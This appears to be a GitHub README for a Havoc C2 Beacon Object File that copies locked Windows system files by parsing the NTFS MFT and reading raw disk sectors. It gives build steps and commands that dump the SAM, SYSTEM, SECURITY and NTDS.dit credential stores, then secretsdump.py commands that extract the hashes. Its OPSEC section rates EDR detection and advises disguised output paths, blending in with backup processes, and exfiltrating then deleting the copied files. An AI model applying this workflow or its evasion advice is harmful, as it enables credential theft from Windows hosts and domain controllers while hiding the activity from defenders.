# UnderlayCopy BOF

Beacon Object File (BOF) for Havoc that copies locked/in-use system files (registry hives, NTDS.dit, etc.) by parsing the NTFS MFT and reading raw volume sectors, without using VSS, Registry APIs, or standard file I/O.

This is a port of [kfallahi's UnderlayCopy PowerShell script](https://github.com/kfallahi/UnderlayCopy) (MFT mode) to a native BOF, removing the PowerShell dependency and significantly reducing the detection surface.

---

## How it works

1. Enables `SeBackupPrivilege` on the current token via `NtAdjustPrivilegesToken`
2. Retrieves the MFT record number of the target file via `GetFileInformationByHandle`
3. Opens the volume `\\.\C:` with synchronous `GENERIC_READ`
4. Reads the NTFS boot sector to obtain `clusterSize` and the `$MFT` offset
5. Reads `$MFT` record 0 and parses its data runs (the MFT is not contiguous on disk)
6. Translates the target MFT record number to a real LCN using the `$MFT` run map
7. Reads the target file's MFT record and parses its `$DATA` attribute and data runs
8. Reads raw clusters from disk and writes them to the destination file

---

## Requirements

- **Local Administrator** (elevated) — SYSTEM is not required
- `SeBackupPrivilege` available in the token (default for elevated processes)
- NTFS volume (not FAT32 or ReFS)
- Havoc C2 framework

---

## Files

```
UnderlayCopy_bof/
├── Underlay_bof.c      # BOF source code
├── Underlay_bof.py     # Havoc command registration script
├── Makefile            # Cross-compilation with mingw-w64
├── beacon.h            # Havoc BOF API header
└── README.md
```

---

## Build

```bash
# Requirements: mingw-w64
sudo apt install mingw-w64

# Compile
make clean && make

# Output: Underlay_bof.o
```

Compiler: `x86_64-w64-mingw32-gcc`

Notable flags:
- `-fno-asynchronous-unwind-tables` — removes `.eh_frame` section
- `-fno-ident` — removes compiler metadata
- `-Os` — optimize for size

---

## Usage

Load the script in Havoc:

```
Script Manager → Load → Underlay_bof.py
```

Run from the agent console:

```
stealthcopy <source> <destination>
```

### Examples

```
# Dump local account hashes
stealthcopy C:\Windows\System32\config\SAM C:\Temp\out.sam
stealthcopy C:\Windows\System32\config\SYSTEM C:\Temp\out.system
stealthcopy C:\Windows\System32\config\SECURITY C:\Temp\out.security

<img width="699" height="496" alt="image" src="https://github.com/user-attachments/assets/d9c6d0be-0b9a-4415-8632-38f3d390f874" />


# Dump Active Directory database (on a DC)
stealthcopy C:\Windows\NTDS\NTDS.dit C:\Temp\out.dit
```

### Post-exploitation — extract hashes

```bash
# Local accounts
secretsdump.py -sam out.sam -system out.system -security out.security LOCAL

# Domain accounts (NTDS)
secretsdump.py -ntds out.dit -system out.system LOCAL
```

---

## OPSEC

### Comparison with the original PowerShell script

| Artifact | PS1 (kfallahi) | This BOF |
|---|---|---|
| AMSI scan | ✅ yes | ❌ no |
| ScriptBlock Logging (EID 4104) | ✅ yes | ❌ no |
| `powershell.exe` process creation | ✅ yes | ❌ no |
| Registry APIs (`RegSaveKeyEx`) | ❌ no | ❌ no |
| Raw volume read (`\\.\C:`) | ✅ yes | ✅ yes |
| Requires SYSTEM | ❌ no | ❌ no |

### Estimated detection

| EDR | Level | Main detection vector |
|---|---|---|
| Microsoft Defender for Endpoint | 🟡 Medium | ETW Kernel-File + raw volume read |
| CrowdStrike Falcon | 🟢 Low-Medium | Raw volume read from legitimate process |
| Elastic EDR | 🟡 Medium | Raw disk read suspicious process rule |
| Windows Defender (basic) | 🟢 Low | No specific rules for this pattern |

### Recommendations

**Destination path** — avoid obvious locations:
```
# Bad
C:\Temp\SAM

# Better
C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\<guid>.tmp
```

**Execution context** — running from a process that legitimately performs backup I/O (e.g. a backup agent running as SYSTEM) makes the pattern indistinguishable from normal activity.

**Clean up** — delete the output file after exfiltration:
```
stealthcopy C:\Windows\System32\config\SAM C:\Temp\out.tmp
download C:\Temp\out.tmp
shell del /f C:\Temp\out.tmp
```

### Credential Guard

Credential Guard protects **in-memory credentials** in `lsass.exe`. It has no effect on filesystem-level access — this technique reads files from disk and is not affected by Credential Guard.

---

## Limitations

- Volume hardcoded to `C:` — modify `vol[]` in the source for other drive letters
- Does not support Alternate Data Streams (ADS)
- MFT record size assumed to be 1024 bytes (standard on all modern NTFS volumes)
- Does not apply MFT fixups (Update Sequence Array) — works correctly in practice but may fail on heavily fragmented records

---

## Credits

Based on [UnderlayCopy](https://github.com/kfallahi/UnderlayCopy) by [@kfallahi](https://github.com/kfallahi) — MFT mode ported to a Havoc BOF.
